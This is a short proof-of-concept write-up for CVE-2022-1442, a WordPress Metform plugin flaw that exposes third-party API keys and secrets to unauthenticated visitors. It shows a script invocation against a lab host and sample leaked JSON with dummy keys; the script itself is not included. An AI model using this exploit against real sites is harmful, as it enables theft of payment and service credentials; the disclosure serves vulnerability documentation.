# CVE-2022-1442
WordPress Plugin Metform &lt;= 2.1.3 - Improper Access Control Allowing Unauthenticated Sensitive Information Disclosure

# Description
The is vulnerable to sensitive information disclosure due to improper access control in the ~/core/forms/action.php file which can be exploited by an unauthenticated attacker to view all API keys and secrets of integrated third-party APIs such as PayPal, Stripe, Mailchimp, Hubspot, HelpScout, reCAPTCHA etc.

POC
---
```
 bash metform.sh http://wordpress.lan
{
  "form_title": "New Form # 1691056894",
  "success_message": "Thank you! Form submitted successfully.",
  "capture_user_browser_data": "1",
  "store_entries": "1",
  "entry_title": "Entry # [mf_id]",
  "count_views": "1",
  "redirect_to": "",
  "user_email_subject": "",
  "user_email_from": "",
  "user_email_reply_to": "",
  "user_email_body": "",
  "admin_email_subject": "",
  "admin_email_to": "",
  "admin_email_from": "",
  "admin_email_reply_to": "",
  "admin_email_body": "",
  "mf_mailchimp_list_id": "",
  "mf_slack_webhook": "",
  "mf_recaptcha_version": "recaptcha-v2",
  "mf_recaptcha_site_key": "sfsdffd",
  "mf_recaptcha_secret_key": "sfddsf",
  "mf_recaptcha_site_key_v3": "",
  "mf_recaptcha_secret_key_v3": "",
  "mf_mailchimp_api_key": "asdadasdsaddas",
  "input_names": "Example: [mf-inputname]",
  "ckit_opt": [],
  "aweber_opt": [],
  "mp_opt": []
}
```
